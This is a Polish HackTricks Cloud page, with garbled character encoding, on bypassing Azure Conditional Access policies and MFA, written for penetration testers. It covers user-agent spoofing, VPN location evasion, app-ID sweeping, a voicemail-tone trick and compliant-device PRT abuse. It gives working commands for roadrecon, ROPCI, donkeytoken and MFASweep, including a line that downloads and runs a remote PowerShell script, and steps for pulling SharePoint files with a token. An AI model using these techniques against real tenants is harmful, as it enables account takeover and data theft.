# Az - Polityki dostÄ™pu warunkowego i obejÅ›cie MFA

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ sztuczkami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}

## Podstawowe informacje

Polityki dostÄ™pu warunkowego Azure to zasady ustalone w Microsoft Azure, aby egzekwowaÄ‡ kontrole dostÄ™pu do usÅ‚ug i aplikacji Azure na podstawie okreÅ›lonych **warunkÃ³w**. Polityki te pomagajÄ… organizacjom zabezpieczyÄ‡ swoje zasoby, stosujÄ…c odpowiednie kontrole dostÄ™pu w odpowiednich okolicznoÅ›ciach.\
Polityki dostÄ™pu warunkowego zasadniczo **okreÅ›lajÄ…** **Kto** moÅ¼e uzyskaÄ‡ dostÄ™p do **Czego** z **Gdzie** i **Jak**.

Oto kilka przykÅ‚adÃ³w:

1. **Polityka ryzyka logowania**: Ta polityka moÅ¼e byÄ‡ ustawiona na wymaganie uwierzytelnienia wieloskÅ‚adnikowego (MFA), gdy wykryte zostanie ryzyko logowania. Na przykÅ‚ad, jeÅ›li zachowanie logowania uÅ¼ytkownika jest nietypowe w porÃ³wnaniu do jego regularnego wzorca, na przykÅ‚ad logowanie z innego kraju, system moÅ¼e poprosiÄ‡ o dodatkowe uwierzytelnienie.
2. **Polityka zgodnoÅ›ci urzÄ…dzeÅ„**: Ta polityka moÅ¼e ograniczyÄ‡ dostÄ™p do usÅ‚ug Azure tylko do urzÄ…dzeÅ„, ktÃ³re sÄ… zgodne z normami bezpieczeÅ„stwa organizacji. Na przykÅ‚ad, dostÄ™p moÅ¼e byÄ‡ dozwolony tylko z urzÄ…dzeÅ„, ktÃ³re majÄ… aktualne oprogramowanie antywirusowe lub dziaÅ‚ajÄ… na okreÅ›lonej wersji systemu operacyjnego.

## ObejÅ›cia polityk dostÄ™pu warunkowego

MoÅ¼liwe jest, Å¼e polityka dostÄ™pu warunkowego **sprawdza pewne informacje, ktÃ³re moÅ¼na Å‚atwo zmanipulowaÄ‡, co pozwala na obejÅ›cie polityki**. A jeÅ›li na przykÅ‚ad polityka konfigurowaÅ‚a MFA, atakujÄ…cy bÄ™dzie mÃ³gÅ‚ jÄ… obejÅ›Ä‡.

Podczas konfigurowania polityki dostÄ™pu warunkowego naleÅ¼y wskazaÄ‡ **uÅ¼ytkownikÃ³w** objÄ™tych politykÄ… oraz **docelowe zasoby** (takie jak wszystkie aplikacje w chmurze).

NaleÅ¼y rÃ³wnieÅ¼ skonfigurowaÄ‡ **warunki**, ktÃ³re bÄ™dÄ… **wyzwalaÄ‡** politykÄ™:

* **SieÄ‡**: IP, zakresy IP i lokalizacje geograficzne
* MoÅ¼na to obejÅ›Ä‡, uÅ¼ywajÄ…c VPN lub Proxy, aby poÅ‚Ä…czyÄ‡ siÄ™ z krajem lub udaÄ‡ siÄ™ do logowania z dozwolonego adresu IP
* **Ryzyka Microsoftu**: Ryzyko uÅ¼ytkownika, ryzyko logowania, ryzyko wewnÄ™trzne
* **Platformy urzÄ…dzeÅ„**: Dowolne urzÄ…dzenie lub wybierz Android, iOS, Windows Phone, Windows, macOS, Linux
* JeÅ›li nie wybrano â€Dowolne urzÄ…dzenieâ€, ale wszystkie inne opcje sÄ… zaznaczone, moÅ¼na to obejÅ›Ä‡, uÅ¼ywajÄ…c losowego user-agenta, ktÃ³ry nie jest zwiÄ…zany z tymi platformami
* **Aplikacje klienckie**: Opcje to â€PrzeglÄ…darkaâ€, â€Aplikacje mobilne i klienci desktopowiâ€, â€Klienci Exchange ActiveSyncâ€ i â€Inne klienciâ€
* Aby obejÅ›Ä‡ logowanie z nie wybranÄ… opcjÄ…
* **Filtr dla urzÄ…dzeÅ„**: MoÅ¼liwe jest wygenerowanie reguÅ‚y zwiÄ…zanej z uÅ¼ywanym urzÄ…dzeniem
* **PrzepÅ‚ywy uwierzytelniania**: Opcje to â€PrzepÅ‚yw kodu urzÄ…dzeniaâ€ i â€Transfer uwierzytelnianiaâ€
* To nie wpÅ‚ynie na atakujÄ…cego, chyba Å¼e prÃ³buje naduÅ¼yÄ‡ ktÃ³regokolwiek z tych protokoÅ‚Ã³w w prÃ³bie phishingu, aby uzyskaÄ‡ dostÄ™p do konta ofiary

MoÅ¼liwe **wyniki** to: Zablokuj lub Przyznaj dostÄ™p z potencjalnymi warunkami, takimi jak wymaganie MFA, zgodnoÅ›Ä‡ urzÄ…dzenia...

### Platformy urzÄ…dzeÅ„ - Warunek urzÄ…dzenia

MoÅ¼liwe jest ustawienie warunku na podstawie **platformy urzÄ…dzenia** (Android, iOS, Windows, macOS...), jednak opiera siÄ™ to na **user-agencie**, wiÄ™c Å‚atwo to obejÅ›Ä‡. Nawet **wymuszajÄ…c wszystkie opcje MFA**, jeÅ›li uÅ¼yjesz **user-agenta, ktÃ³ry nie jest rozpoznawany,** bÄ™dziesz mÃ³gÅ‚ obejÅ›Ä‡ MFA lub blokadÄ™:

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Wystarczy, Å¼e przeglÄ…darka **wyÅ›le nieznany user-agent** (jak `Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile`), aby nie wywoÅ‚aÄ‡ tego warunku.\
MoÅ¼esz rÄ™cznie zmieniÄ‡ user-agenta w narzÄ™dziach deweloperskich:

<figure><img src="../../../.gitbook/assets/image (351).png" alt="" width="375"><figcaption></figcaption></figure>

&#x20;Lub uÅ¼yÄ‡ [rozszerzenia przeglÄ…darki takiego jak to](https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg?hl=en).

### Lokalizacje: Kraje, zakresy IP - Warunek urzÄ…dzenia

JeÅ›li to jest ustawione w polityce warunkowej, atakujÄ…cy moÅ¼e po prostu uÅ¼yÄ‡ **VPN** w **dozwolonym kraju** lub sprÃ³bowaÄ‡ znaleÅºÄ‡ sposÃ³b na dostÄ™p z **dozwolonego adresu IP**, aby obejÅ›Ä‡ te warunki.

### Aplikacje w chmurze

MoÅ¼liwe jest skonfigurowanie **polityk dostÄ™pu warunkowego, aby zablokowaÄ‡ lub wymusiÄ‡** na przykÅ‚ad MFA, gdy uÅ¼ytkownik prÃ³buje uzyskaÄ‡ dostÄ™p do **konkretnej aplikacji**:

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

Aby sprÃ³bowaÄ‡ obejÅ›Ä‡ tÄ™ ochronÄ™, powinieneÅ› sprawdziÄ‡, czy moÅ¼esz **zalogowaÄ‡ siÄ™ tylko do dowolnej aplikacji**.\
NarzÄ™dzie [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep) ma **dziesiÄ…tki identyfikatorÃ³w aplikacji wbudowanych** i sprÃ³buje siÄ™ do nich zalogowaÄ‡, informujÄ…c ciÄ™ o tym i nawet dajÄ…c token, jeÅ›li siÄ™ powiedzie.

Aby **przetestowaÄ‡ konkretne identyfikatory aplikacji w konkretnych zasobach**, moÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ narzÄ™dzia takiego jak:

{% code overflow="wrap" %}
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokens-stdout

<token>
```
{% endcode %}

Ponadto moÅ¼liwe jest rÃ³wnieÅ¼ zabezpieczenie metody logowania (np. jeÅ›li prÃ³bujesz zalogowaÄ‡ siÄ™ z przeglÄ…darki lub z aplikacji desktopowej). NarzÄ™dzie [**Invoke-MFASweep**](az-conditional-access-policies-mfa-bypass.md#invoke-mfasweep) wykonuje pewne kontrole, aby sprÃ³bowaÄ‡ obejÅ›Ä‡ te zabezpieczenia.

NarzÄ™dzie [**donkeytoken**](az-conditional-access-policies-mfa-bypass.md#donkeytoken) moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼ywane do podobnych celÃ³w, chociaÅ¼ wydaje siÄ™ byÄ‡ nieaktualizowane.

NarzÄ™dzie [**ROPCI**](https://github.com/wunderwuzzi23/ropci) moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼ywane do testowania tych zabezpieczeÅ„ i sprawdzenia, czy moÅ¼liwe jest obejÅ›cie MFA lub blokad, ale to narzÄ™dzie dziaÅ‚a z perspektywy **whitebox**. Najpierw musisz pobraÄ‡ listÄ™ aplikacji dozwolonych w dzierÅ¼awie, a nastÄ™pnie sprÃ³buje siÄ™ do nich zalogowaÄ‡.

## Inne obejÅ›cia Az MFA

### Dzwonek

JednÄ… z opcji Azure MFA jest **otrzymanie poÅ‚Ä…czenia na skonfigurowany numer telefonu**, gdzie uÅ¼ytkownik zostanie poproszony o **wysÅ‚anie znaku `#`**.

{% hint style="danger" %}
PoniewaÅ¼ znaki to tylko **tony**, atakujÄ…cy mÃ³gÅ‚by **skomprymowaÄ‡** wiadomoÅ›Ä‡ **poczty gÅ‚osowej** na numerze telefonu, skonfigurowaÄ‡ jako wiadomoÅ›Ä‡ **ton `#`** i nastÄ™pnie, gdy Å¼Ä…da MFA, upewniÄ‡ siÄ™, Å¼e **telefon ofiary jest zajÄ™ty** (dzwoniÄ…c do niego), aby poÅ‚Ä…czenie Azure zostaÅ‚o przekierowane do poczty gÅ‚osowej.
{% endhint %}

### Zgodne urzÄ…dzenia

Polityki czÄ™sto wymagajÄ… zgodnego urzÄ…dzenia lub MFA, wiÄ™c **atakujÄ…cy mÃ³gÅ‚by zarejestrowaÄ‡ zgodne urzÄ…dzenie**, uzyskaÄ‡ token **PRT** i **w ten sposÃ³b obejÅ›Ä‡ MFA**.

Zacznij od zarejestrowania **zgodnego urzÄ…dzenia w Intune**, a nastÄ™pnie **uzyskaj PRT** za pomocÄ…:
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
ZnajdÅº wiÄ™cej informacji na temat tego rodzaju ataku na nastÄ™pujÄ…cej stronie:

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## NarzÄ™dzia

### [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep)

Ten skrypt pobiera dane uwierzytelniajÄ…ce uÅ¼ytkownika i sprawdza, czy moÅ¼e zalogowaÄ‡ siÄ™ do niektÃ³rych aplikacji.

To jest przydatne, aby zobaczyÄ‡, czy **nie jest wymagane MFA do zalogowania siÄ™ do niektÃ³rych aplikacji**, ktÃ³re moÅ¼esz pÃ³Åºniej wykorzystaÄ‡ do **eskalacji uprawnieÅ„**.

### [roadrecon](https://github.com/dirkjanm/ROADtools)

Pobierz wszystkie polityki
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep to skrypt PowerShell, ktÃ³ry prÃ³buje **zalogowaÄ‡ siÄ™ do rÃ³Å¼nych usÅ‚ug Microsoftu, uÅ¼ywajÄ…c podanego zestawu poÅ›wiadczeÅ„ i sprÃ³buje zidentyfikowaÄ‡, czy MFA jest wÅ‚Ä…czone**. W zaleÅ¼noÅ›ci od tego, jak skonfigurowane sÄ… zasady dostÄ™pu warunkowego i inne ustawienia uwierzytelniania wieloskÅ‚adnikowego, niektÃ³re protokoÅ‚y mogÄ… pozostaÄ‡ jako jednoskÅ‚adnikowe. Posiada rÃ³wnieÅ¼ dodatkowe sprawdzenie konfiguracji ADFS i moÅ¼e prÃ³bowaÄ‡ zalogowaÄ‡ siÄ™ do lokalnego serwera ADFS, jeÅ›li zostanie wykryty.
```bash
Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1").Content
Invoke-MFASweep -Username <username> -Password <pass>
```
### [ROPCI](https://github.com/wunderwuzzi23/ropci)

To narzÄ™dzie pomogÅ‚o zidentyfikowaÄ‡ obejÅ›cia MFA, a nastÄ™pnie wykorzystaÄ‡ API w wielu produkcyjnych dzierÅ¼awach AAD, gdzie klienci AAD wierzyli, Å¼e majÄ… wymuszone MFA, ale uwierzytelnianie oparte na ROPC zakoÅ„czyÅ‚o siÄ™ sukcesem.

{% hint style="success" %}
Musisz mieÄ‡ uprawnienia do wyÅ›wietlenia wszystkich aplikacji, aby mÃ³c wygenerowaÄ‡ listÄ™ aplikacji do ataku brute-force.
{% endhint %}
```bash
./ropci configure
./ropci apps list --all --format json -o apps.json
./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
./ropci auth bulk -i apps.csv -o results.json
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token to zestaw funkcji, ktÃ³re majÄ… na celu pomoc konsultantom ds. bezpieczeÅ„stwa, ktÃ³rzy muszÄ… weryfikowaÄ‡ Polityki DostÄ™pu Warunkowego, testy dla portali Microsoft z wÅ‚Ä…czonym 2FA itp.

<pre class="language-powershell"><code class="lang-powershell"><strong>git clone https://github.com/silverhack/donkeytoken.git
</strong><strong>Import-Module '.\donkeytoken' -Force
</strong></code></pre>

**Testuj kaÅ¼dy portal**, czy moÅ¼liwe jest **zalogowanie siÄ™ bez MFA**:
```powershell
$username = "conditional-access-app-user@azure.training.hacktricks.xyz"
$password = ConvertTo-SecureString "Poehurgi78633" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-MFATest -credential $cred -Verbose -Debug -InformationAction Continue
```
PoniewaÅ¼ **portal** **Azure** **nie jest ograniczony**, moÅ¼liwe jest **zdobycie tokena z punktu koÅ„cowego portalu, aby uzyskaÄ‡ dostÄ™p do dowolnej usÅ‚ugi wykrytej** przez wczeÅ›niejsze wykonanie. W tym przypadku zidentyfikowano Sharepoint, a token do uzyskania dostÄ™pu do niego jest Å¼Ä…dany:

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

ZakÅ‚adajÄ…c, Å¼e token ma uprawnienia Sites.Read.All (z Sharepoint), nawet jeÅ›li nie moÅ¼esz uzyskaÄ‡ dostÄ™pu do Sharepoint z sieci z powodu MFA, moÅ¼liwe jest uÅ¼ycie tokena do uzyskania dostÄ™pu do plikÃ³w za pomocÄ… wygenerowanego tokena:
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## Odniesienia

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
